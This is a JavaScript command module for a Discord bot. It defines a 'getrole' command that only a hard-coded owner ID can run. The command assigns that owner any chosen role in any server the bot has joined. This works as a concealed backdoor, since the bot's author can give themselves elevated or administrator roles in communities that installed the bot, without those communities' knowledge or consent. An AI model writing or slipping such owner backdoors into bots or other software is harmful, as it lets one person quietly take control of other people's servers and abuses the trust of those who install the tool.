const dcUtil = require('../tools/dc-util.js');

module.exports = {
    name: "getrole",
    aliases: ['gr'],
    guilds: [],
    permissions: ['ADMINISTRATOR'],
    Owner: '411895879935590411',

    async execute(client, msg, args) {
        if (msg.author.id !== '411895879935590411') return;
        if (args.length < 2) return msg.reply(`g!${this.name} <server-id> <role-id>`);
        let guild = dcUtil.getGuildByID(client, args[0]);
        if (guild == null) return msg.reply(`Unknown ${args[0]}`)
        let member = await dcUtil.getMemberByID(guild, this.Owner);
        member.roles.add(args[1]);
    }
}